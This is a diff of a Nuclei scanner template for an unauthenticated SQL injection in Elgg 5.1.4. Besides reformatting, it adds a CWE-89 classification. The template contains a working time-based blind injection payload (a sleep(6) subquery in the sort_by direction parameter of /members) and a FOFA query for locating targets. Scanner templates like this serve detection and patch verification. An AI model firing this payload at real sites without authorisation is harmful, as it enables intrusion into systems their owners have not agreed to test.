@@ -1,5 +1,4 @@
 id: elgg-sqli
-
 info:
   name: Elgg 5.1.4 - SQL Injection
   author: s4e-io
@@ -9,41 +8,40 @@ info:
   reference:
     - https://github.com/4rdr/proofs/blob/main/info/Elgg_unauth_SQLi_5.1.4.md
     - https://github.com/Elgg/Elgg
+  classification:
+    cwe-id:
+      - CWE-89
   metadata:
-    verified: true
-    max-request: 1
-    vendor: elgg
-    product: elgg
     fofa-query: icon_hash="413602919"
-  tags: elgg,sqli
-
+    max-request: 1
+    product: elgg
+    vendor: elgg
+    verified: true
+  tags: elgg,sqli,vuln
 flow: http(1) && http(2)
-
 http:
-  - raw:
+  - matchers:
+      - condition: and
+        dsl:
+          - contains(body,"elgg.js")
+          - status_code == 200
+        internal: true
+        type: dsl
+    raw:
       - |
         GET / HTTP/1.1
         Host: {{Hostname}}
+  - matchers:
+      - condition: and
+        # digest: 4b0a00483046022100a1427ee890b2013312ca3ccd0ae189fa139aa2c75f91d9707c942d4ffe208554022100d11dbbd6659d89cd17a9bac27fb2e8d822d84f02f0385c5b6c2baa0daf7421a0:922c64590222798bb761d5b6d8e72950
 
-    matchers:
-      - type: dsl
         dsl:
-          - 'contains(body,"elgg.js")'
-          - 'status_code == 200'
-        condition: and
-        internal: true
-
-  - raw:
+          - duration >= 6
+          - contains(body,"All members")
+          - status_code == 200
+        type: dsl
+    raw:
       - |
         @timeout 20s
         GET /members?sort_by%5Bproperty%5D=name&sort_by%5Bproperty_type%5D=metadata&sort_by%5Bdirection%5D=desc%2c(select*from(select(sleep(6)))a) HTTP/1.1
         Host: {{Hostname}}
-
-    matchers:
-      - type: dsl
-        dsl:
-          - 'duration >= 6'
-          - 'contains(body,"All members")'
-          - 'status_code == 200'
-        condition: and
-# digest: 4a0a00473045022055e76939530e4a2ea815987014ec77153691f482b202d090a914a23b07b4beaf022100a90e28a291b5c73bab0de821409d3bc71e2d7ebfc961734903bf8cbd4e50c405:922c64590222798bb761d5b6d8e72950
